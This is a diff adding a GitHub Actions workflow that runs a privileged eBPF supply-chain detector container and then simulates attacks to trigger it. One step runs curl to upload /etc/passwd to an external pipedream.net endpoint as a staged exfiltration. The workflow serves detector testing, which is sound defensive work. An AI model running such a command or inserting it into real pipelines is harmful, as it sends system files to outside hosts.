@@ -1,0 +1,44 @@
+name: Run eBPF Supply Chain Detector 2
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  run-ebpf:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Pull latest image
+        run: docker pull rohitcoder/supplychain:latest
+
+      - name: Run eBPF supply chain detector in background
+        run: |
+          docker run -d --name ebpf_detector1 --privileged \
+          --pid=host \
+          --network=host \
+          -v /sys:/sys \
+          -v /proc:/proc \
+          -v /lib/modules:/lib/modules \
+          -v /usr/src:/usr/src \
+          rohitcoder/supplychain:latest
+
+      - name: Wait for eBPF to attach
+        run: sleep 10
+
+      - name: Simulate supply chain exfiltration
+        run: |
+          curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net --data-binary "@/etc/passwd"
+
+      - name: Simulate .env file access to trigger detector
+        run: |
+          touch /tmp/test.env
+          cat /tmp/test.env
+
+      - name: Save detector logs to file
+        run: |
+          docker logs ebpf_detector1 > ebpf_logs.txt
+          cat ebpf_logs.txt
+
+      - name: Stop and cleanup
+        run: docker rm -f ebpf_detector1
